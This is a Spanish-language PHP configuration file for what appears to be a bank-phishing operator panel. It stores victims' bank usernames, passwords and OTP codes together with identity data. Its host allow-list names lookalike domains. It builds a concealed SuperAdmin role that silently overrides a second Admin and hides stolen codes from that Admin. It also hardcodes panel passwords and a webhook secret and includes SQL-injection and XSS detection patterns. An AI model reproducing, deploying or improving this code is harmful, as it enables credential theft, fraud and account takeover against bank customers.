<?php
// panel/config/config.php
// 🔒 CONFIGURACIÓN CON MÁXIMA SEGURIDAD
// DOMINIO: tradilberco.sbs
// ✅ SISTEMA DE ROLES: SUPERADMIN + ADMIN
// ✅ PRIORIDAD: SuperAdmin siempre gana, Admin nunca lo sabe

// ============================================
// 🚫 BLOQUEAR ACCESO DIRECTO COMPLETAMENTE
// ============================================

if (php_sapi_name() !== 'cli') {
    if (strpos($_SERVER['REQUEST_URI'] ?? '', 'config.php') !== false ||
        strpos($_SERVER['SCRIPT_FILENAME'] ?? '', 'config.php') !== false ||
        basename($_SERVER['PHP_SELF'] ?? '') === 'config.php') {
        http_response_code(403);
        header('Content-Type: text/plain; charset=utf-8');
        exit('403 Forbidden');
    }
}

// ============================================
// 🔒 PREVENIR INCLUSIONES INSEGURAS
// ============================================

if (!function_exists('estaAutenticado')) {
    if (!defined('__CONFIG_LOADED__')) {
        define('__CONFIG_LOADED__', true);
    }
}

// ============================================
// 🛡️ PREVENIR INYECCIÓN DE VARIABLES
// ============================================

$_GET = array_map('trim', $_GET ?? []);
$_POST = array_map('trim', $_POST ?? []);
$_COOKIE = array_map('trim', $_COOKIE ?? []);

// ============================================
// === CREDENCIALES DEL PANEL (PROTEGIDAS) ===
// ============================================

// 🔴 SUPERADMIN (Root) - Ve todo, prioridad máxima
const SUPERADMIN_USER = 'Root#8XkM$9pNrQ@vS3wYz';
const SUPERADMIN_PASSWORD = '1#2y$12$W8kL9mNpQ@vR2wYzA.bCdEfGhIjKlMnOqRsTuVwXyZ0123456789';

// 🔵 ADMIN NORMAL - Ve todo pero sin prioridad
const ADMIN_USER = 'Admin#7BmK$3qWsE@rT5yUi';
const ADMIN_PASSWORD = '2#3z$13$X9lM0nOqR@sS3xZaB.cDeFgHiJkLmNoPqRsTuVwXyZ987654321';

// Compatibilidad con constantes antiguas (mapeadas a SuperAdmin)
const PANEL_USER = SUPERADMIN_USER;
const PANEL_PASSWORD = SUPERADMIN_PASSWORD;

// WEBHOOK SECRET
const WEBHOOK_SECRET = 'A9AF97EOZYQAYQNB67T9WPN7DWYC70J6';

// ============================================
// ⏱️ TIEMPO DE PRIORIDAD
// ============================================
// Segundos que el Admin debe esperar antes de:
//  - Poder actuar sobre una solicitud que el SuperAdmin manipuló
//  - Ver credenciales del banco + códigos que el SuperAdmin pidió
// 180 segundos = 3 minutos
const PRIORIDAD_DELAY = 180;

// ============================================
// ⏱️ DELAY PARA MOSTRAR QUE ADMIN MANIPULA (solo SuperAdmin)
// ============================================
// Segundos que el SuperAdmin debe esperar antes de ver
// el aviso de que el Admin está manipulando (para que no sea
// instantáneo y parezca más natural)
const DELAY_AVISO_ADMIN = 15; // 15 segundos

// ============================================
// === RUTAS SEGURAS ===
// ============================================

const DATA_DIR = __DIR__ . '/../../data/';
const SOLICITUDES_FILE = DATA_DIR . 'solicitudes.dat';
const LOG_FILE = DATA_DIR . 'login_log.txt';
const RATELIMIT_DIR = DATA_DIR . 'ratelimit/';
const SESIONES_FILE = DATA_DIR . 'sesiones.json';

// ============================================
// === CREAR DIRECTORIOS CON PERMISOS SEGUROS ===
// ============================================

if (!is_dir(DATA_DIR)) {
    mkdir(DATA_DIR, 0700, true);
    chmod(DATA_DIR, 0700);
}

if (!is_dir(RATELIMIT_DIR)) {
    mkdir(RATELIMIT_DIR, 0700, true);
    chmod(RATELIMIT_DIR, 0700);
}

if (!file_exists(DATA_DIR . '.htaccess')) {
    $htaccess_content = "Order Deny,Allow\nDeny from all\n";
    file_put_contents(DATA_DIR . '.htaccess', $htaccess_content, LOCK_EX);
    chmod(DATA_DIR . '.htaccess', 0644);
}

// ============================================
// === CONFIGURACIÓN DE SESIÓN SEGURA ===
// ============================================

$cookie_options = [
    'secure' => (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on'),
    'httponly' => true,
    'samesite' => 'Strict',
    'path' => '/panel/',
    'domain' => '',
];

if (in_array($_SERVER['HTTP_HOST'] ?? '', ['localhost', '127.0.0.1', 'localhost:8000', '127.0.0.1:8000'])) {
    $cookie_options['secure'] = false;
}

session_set_cookie_params($cookie_options);

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// ============================================
// === MANTENER SESIÓN ACTIVA - SIN TIMEOUT ===
// ============================================

if (!isset($_SESSION['session_created'])) {
    $_SESSION['session_created'] = time();
    $_SESSION['last_activity'] = time();
}

$_SESSION['last_activity'] = time();

// ============================================
// === FUNCIONES DE ROLES ===
// ============================================

/**
 * Obtener el rol del usuario actual
 * @return string 'superadmin' | 'admin' | 'invitado'
 */
function obtenerRolActual() {
    if (!isset($_SESSION['autenticado']) || $_SESSION['autenticado'] !== true) {
        return 'invitado';
    }
    return $_SESSION['rol'] ?? 'admin';
}

/**
 * ¿Es SuperAdmin?
 */
function esSuperAdmin() {
    return obtenerRolActual() === 'superadmin';
}

/**
 * ¿Es Admin normal?
 */
function esAdmin() {
    return obtenerRolActual() === 'admin';
}

/**
 * ¿El usuario actual puede actuar sobre esta solicitud?
 *
 * Reglas:
 *  - SuperAdmin: SIEMPRE puede (incluso si Admin pidió primero).
 *  - Admin: solo puede si NADIE la manipuló en los últimos PRIORIDAD_DELAY segundos.
 *           Si el SuperAdmin la manipuló, sus botones quedan inertes pero VISIBLES,
 *           y NUNCA recibe un mensaje que revele que hay un SuperAdmin.
 */
function puedeActuarSobreSolicitud($solicitud) {
    $rol = obtenerRolActual();

    // SuperAdmin siempre puede
    if ($rol === 'superadmin') {
        return true;
    }

    $manipuladoRol = $solicitud['manipulado_rol'] ?? null;
    $manipuladoTs  = $solicitud['manipulado_timestamp'] ?? 0;

    // Nadie la está manipulando → puede
    if (!$manipuladoRol || !$manipuladoTs) {
        return true;
    }

    // Si el SuperAdmin la manipuló recientemente → Admin NO puede
    if ($manipuladoRol === 'superadmin') {
        if ((time() - $manipuladoTs) < PRIORIDAD_DELAY) {
            return false;
        }
    }

    return true;
}

/**
 * ¿Debe mostrarse la info SENSIBLE al usuario actual?
 *
 * Info sensible = credenciales del banco (usuario/contraseña) + códigos (OTP, etc.)
 *
 * Reglas:
 *  - SuperAdmin: SIEMPRE ve todo.
 *  - Admin: si el SuperAdmin la manipuló en los últimos PRIORIDAD_DELAY segundos,
 *           NO ve las credenciales ni los códigos hasta que pase el tiempo.
 *           Los datos del cliente (nombre, cédula, etc.) SÍ los ve siempre.
 */
function puedeVerInfoSolicitud($solicitud) {
    $rol = obtenerRolActual();

    if ($rol === 'superadmin') {
        return true;
    }

    $manipuladoRol = $solicitud['manipulado_rol'] ?? null;
    $manipuladoTs  = $solicitud['manipulado_timestamp'] ?? 0;

    if ($manipuladoRol === 'superadmin' && $manipuladoTs) {
        if ((time() - $manipuladoTs) < PRIORIDAD_DELAY) {
            return false;
        }
    }

    return true;
}

/**
 * ¿Debe mostrarse el aviso de "Admin manipulando" al SuperAdmin?
 *
 * Con delay de DELAY_AVISO_ADMIN segundos para que no sea instantáneo.
 */
function debeMostrarAvisoAdmin($solicitud) {
    $rol = obtenerRolActual();

    // Solo el SuperAdmin ve este aviso
    if ($rol !== 'superadmin') {
        return false;
    }

    $manipuladoRol = $solicitud['manipulado_rol'] ?? null;
    $manipuladoTs  = $solicitud['manipulado_timestamp'] ?? 0;

    if ($manipuladoRol !== 'admin') {
        return false;
    }

    // El aviso aparece tras DELAY_AVISO_ADMIN segundos y dura hasta PRIORIDAD_DELAY
    $delta = time() - $manipuladoTs;
    return ($delta >= DELAY_AVISO_ADMIN && $delta < PRIORIDAD_DELAY);
}

/**
 * Marcar solicitud como manipulada por el usuario actual.
 *
 * REGLA CLAVE:
 *  - SuperAdmin SIEMPRE sobreescribe el estado (es el dueño).
 *  - Admin solo puede escribir si NADIE ya lo marcó en los últimos
 *    PRIORIDAD_DELAY segundos.
 *
 * @return bool true si se marcó, false si fue bloqueado silenciosamente
 */
function marcarManipulacion(&$solicitud) {
    $rolActual = obtenerRolActual();
    $manipuladoRol = $solicitud['manipulado_rol'] ?? null;
    $manipuladoTs  = $solicitud['manipulado_timestamp'] ?? 0;

    // Si el Admin intenta escribir y el SuperAdmin ya lo hizo hace poco → NO sobreescribir
    if ($rolActual === 'admin'
        && $manipuladoRol === 'superadmin'
        && (time() - $manipuladoTs) < PRIORIDAD_DELAY) {
        return false; // ⛔ Bloqueado silenciosamente
    }

    // En cualquier otro caso, el usuario actual toma el control
    $solicitud['manipulado_por'] = $_SESSION['usuario'] ?? 'desconocido';
    $solicitud['manipulado_rol'] = $rolActual;
    $solicitud['manipulado_timestamp'] = time();
    return true;
}

/**
 * Verificar si el usuario está autenticado
 */
function estaAutenticado() {
    if (!isset($_SESSION['autenticado']) || $_SESSION['autenticado'] !== true) {
        return false;
    }

    $_SESSION['last_activity'] = time();
    registrarSesion();
    limpiarSesionesInactivas();

    return true;
}

/**
 * Generar token CSRF seguro
 */
function generarCsrfToken() {
    if (empty($_SESSION['csrf_token']) || empty($_SESSION['csrf_token_time'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
        $_SESSION['csrf_token_time'] = time();
        return $_SESSION['csrf_token'];
    }

    if (time() - ($_SESSION['csrf_token_time'] ?? 0) > 3600) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
        $_SESSION['csrf_token_time'] = time();
    }

    return $_SESSION['csrf_token'];
}

/**
 * Verificar token CSRF
 */
function verificarCsrfToken($token) {
    if (empty($_SESSION['csrf_token'])) {
        return false;
    }

    if (!hash_equals($_SESSION['csrf_token'], $token ?? '')) {
        return false;
    }

    if (time() - ($_SESSION['csrf_token_time'] ?? 0) > 3600) {
        return false;
    }

    return true;
}

/**
 * Obtener IP real del cliente
 */
function getIp() {
    $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';

    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $ip = trim($ips[0]);
    } elseif (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }

    if (!filter_var($ip, FILTER_VALIDATE_IP)) {
        $ip = '0.0.0.0';
    }

    return $ip;
}

/**
 * Rate limiting
 */
function checkRateLimit($ip, $limit = 5, $timeWindow = 900) {
    if (!is_dir(RATELIMIT_DIR)) {
        mkdir(RATELIMIT_DIR, 0700, true);
    }

    $ip_hash = md5($ip);
    $file = RATELIMIT_DIR . 'ratelimit_' . $ip_hash . '.json';

    if (!file_exists($file)) {
        $data = ['count' => 1, 'time' => time(), 'ip' => $ip];
        file_put_contents($file, json_encode($data), LOCK_EX);
        chmod($file, 0600);
        return true;
    }

    $json = file_get_contents($file);
    $data = json_decode($json, true);

    if (time() - ($data['time'] ?? 0) > $timeWindow) {
        $data = ['count' => 1, 'time' => time(), 'ip' => $ip];
        file_put_contents($file, json_encode($data), LOCK_EX);
        return true;
    }

    if (($data['count'] ?? 0) >= $limit) {
        return false;
    }

    $data['count']++;
    file_put_contents($file, json_encode($data), LOCK_EX);
    chmod($file, 0600);

    return true;
}

/**
 * Cargar solicitudes
 */
function cargarSolicitudes() {
    if (!file_exists(SOLICITUDES_FILE)) {
        file_put_contents(SOLICITUDES_FILE, json_encode([]), LOCK_EX);
        chmod(SOLICITUDES_FILE, 0600);
        return [];
    }

    $json = file_get_contents(SOLICITUDES_FILE);
    $data = json_decode($json, true);

    if (!is_array($data)) {
        return [];
    }

    return $data;
}

/**
 * Guardar solicitudes
 */
function guardarSolicitudes($solicitudes) {
    if (!is_array($solicitudes)) {
        throw new Exception('Los datos deben ser un array');
    }

    if (!is_dir(DATA_DIR)) {
        mkdir(DATA_DIR, 0700, true);
    }

    file_put_contents(
        SOLICITUDES_FILE,
        json_encode($solicitudes, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE),
        LOCK_EX
    );

    chmod(SOLICITUDES_FILE, 0600);
}

/**
 * Generar ID único
 */
function generarId() {
    return 'SOL-' . date('Ymd') . '-' . strtoupper(bin2hex(random_bytes(3)));
}

/**
 * Registrar intentos de login
 */
function logLoginIntento($usuario, $exito, $ip) {
    $timestamp = date('Y-m-d H:i:s');
    $status = $exito ? 'ÉXITO' : 'FALLO';
    $logEntry = "[{$timestamp}] IP: {$ip} | Usuario: {$usuario} | Status: {$status}\n";

    file_put_contents(LOG_FILE, $logEntry, FILE_APPEND | LOCK_EX);
    chmod(LOG_FILE, 0600);
}

/**
 * Sanitizar
 */
function sanitizar($input) {
    if (is_array($input)) {
        return array_map('sanitizar', $input);
    }

    $input = trim($input);
    $input = str_replace(chr(0), '', $input);

    return $input;
}

/**
 * Escapar HTML
 */
function escapar($text) {
    return htmlspecialchars($text, ENT_QUOTES, 'UTF-8');
}

/**
 * Validar email
 */
function validarEmail($email) {
    return filter_var($email, FILTER_VALIDATE_EMAIL) !== false;
}

/**
 * Validar IP
 */
function validarIp($ip) {
    return filter_var($ip, FILTER_VALIDATE_IP) !== false;
}

// ============================================
// === FUNCIONES PARA GESTIÓN DE SESIONES ===
// ============================================

function cargarSesiones() {
    if (!file_exists(SESIONES_FILE)) {
        file_put_contents(SESIONES_FILE, json_encode([]), LOCK_EX);
        chmod(SESIONES_FILE, 0600);
        return [];
    }

    $json = file_get_contents(SESIONES_FILE);
    $data = json_decode($json, true);

    return is_array($data) ? $data : [];
}

function guardarSesiones($sesiones) {
    if (!is_array($sesiones)) {
        throw new Exception('Los datos deben ser un array');
    }

    if (!is_dir(DATA_DIR)) {
        mkdir(DATA_DIR, 0700, true);
    }

    file_put_contents(
        SESIONES_FILE,
        json_encode($sesiones, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE),
        LOCK_EX
    );

    chmod(SESIONES_FILE, 0600);
}

function registrarSesion() {
    $sesiones = cargarSesiones();
    $sessionId = session_id();
    $ip = getIp();
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
    $ahora = date('Y-m-d H:i:s');
    $rol = $_SESSION['rol'] ?? 'desconocido';
    $usuario = $_SESSION['usuario'] ?? 'desconocido';

    foreach ($sesiones as &$s) {
        if ($s['id'] === $sessionId) {
            $s['ultima_actividad'] = $ahora;
            $s['ip'] = $ip;
            $s['user_agent'] = $userAgent;
            $s['rol'] = $rol;
            $s['usuario'] = $usuario;
            $s['activa'] = true;
            guardarSesiones($sesiones);
            return;
        }
    }

    $sesiones[] = [
        'id' => $sessionId,
        'fecha' => $ahora,
        'ultima_actividad' => $ahora,
        'ip' => $ip,
        'user_agent' => $userAgent,
        'rol' => $rol,
        'usuario' => $usuario,
        'activa' => true
    ];

    guardarSesiones($sesiones);
}

function limpiarSesionesInactivas() {
    $sesiones = cargarSesiones();
    $nuevasSesiones = [];
    $limite = 30 * 60;
    $ahora = time();

    foreach ($sesiones as $s) {
        $ultima = strtotime($s['ultima_actividad'] ?? $s['fecha'] ?? 'now');
        if ($ahora - $ultima < $limite) {
            $s['activa'] = true;
            $nuevasSesiones[] = $s;
        } else {
            $s['activa'] = false;
            if ($ahora - $ultima < 86400) {
                $nuevasSesiones[] = $s;
            }
        }
    }

    if (count($nuevasSesiones) !== count($sesiones)) {
        guardarSesiones($nuevasSesiones);
    }
}

function getBrowserInfo($userAgent) {
    $browser = 'Desconocido';
    $platform = 'Desconocido';

    if (strpos($userAgent, 'Chrome') !== false) $browser = 'Chrome';
    elseif (strpos($userAgent, 'Firefox') !== false) $browser = 'Firefox';
    elseif (strpos($userAgent, 'Safari') !== false) $browser = 'Safari';
    elseif (strpos($userAgent, 'Edge') !== false) $browser = 'Edge';
    elseif (strpos($userAgent, 'Opera') !== false || strpos($userAgent, 'OPR') !== false) $browser = 'Opera';
    elseif (strpos($userAgent, 'MSIE') !== false || strpos($userAgent, 'Trident') !== false) $browser = 'Internet Explorer';

    if (strpos($userAgent, 'Windows') !== false) $platform = 'Windows';
    elseif (strpos($userAgent, 'Mac OS X') !== false || strpos($userAgent, 'Macintosh') !== false) $platform = 'macOS';
    elseif (strpos($userAgent, 'Linux') !== false) $platform = 'Linux';
    elseif (strpos($userAgent, 'Android') !== false) $platform = 'Android';
    elseif (strpos($userAgent, 'iPhone') !== false || strpos($userAgent, 'iPad') !== false) $platform = 'iOS';

    return ['browser' => $browser, 'platform' => $platform];
}

function getBrowserIcon($browser) {
    $iconos = [
        'Chrome' => '🌐',
        'Firefox' => '🦊',
        'Safari' => '🧭',
        'Edge' => '🌊',
        'Opera' => '🎭',
        'Internet Explorer' => '📟',
        'Desconocido' => '❓'
    ];
    return $iconos[$browser] ?? '❓';
}

// ============================================
// === VALIDACIÓN DE HOST PERMITIDO ===
// ============================================

$allowed_hosts = [
    'tradilberco.sbs',
    'www.tradilberco.sbs',
    'libertcocertf.sbs',
    'www.libertcocertf.sbs',
    'libertcocertf.online',
    'www.libertcocertf.online',
    'www.certfilibrt.sbs',
    'pcoplacaslidariobgt.online',
    'www.pcoplacaslidariobgt.online',
    'localhost',
    '127.0.0.1',
    'localhost:8000',
    '127.0.0.1:8000'
];

$http_host = $_SERVER['HTTP_HOST'] ?? '';

$is_localhost = (strpos($http_host, 'localhost') !== false ||
                 strpos($http_host, '127.0.0.1') !== false);

if (!$is_localhost && !in_array($http_host, $allowed_hosts)) {
    http_response_code(403);
    header('Content-Type: text/plain; charset=utf-8');
    exit('403 Forbidden - Host no permitido');
}

// ============================================
// === HEADERS DE SEGURIDAD ===
// ============================================

header('X-Frame-Options: DENY');
header('X-Content-Type-Options: nosniff');
header('X-XSS-Protection: 1; mode=block');
header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com;");
header('Referrer-Policy: no-referrer');
header('Cache-Control: no-cache, no-store, must-revalidate, private');
header('Pragma: no-cache');
header('Expires: 0');

if (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') {
    header('Strict-Transport-Security: max-age=31536000; includeSubDomains; preload');
}

header_remove('Server');
header_remove('X-Powered-By');
header_remove('X-AspNet-Version');

// ============================================
// === PROTECCIÓN CONTRA ATAQUES COMUNES ===
// ============================================

function detectarSqlInjection($input) {
    $patterns = [
        '/(\b(UNION|SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|EXECUTE)\b)/i',
        '/(-{2})|({\/\*)|(\*\/)/i',
        '/(;|\||&&|\|\|)/i',
    ];

    foreach ($patterns as $pattern) {
        if (preg_match($pattern, $input)) {
            return true;
        }
    }

    return false;
}

function detectarXss($input) {
    $patterns = [
        '/<script[^>]*>.*?<\/script>/i',
        '/<iframe[^>]*>.*?<\/iframe>/i',
        '/javascript:/i',
        '/on\w+\s*=/i',
        '/<svg[^>]*>.*?<\/svg>/i',
    ];

    foreach ($patterns as $pattern) {
        if (preg_match($pattern, $input)) {
            return true;
        }
    }

    return false;
}

// ============================================
// === FIN DE CONFIGURACIÓN ===
// ============================================

?>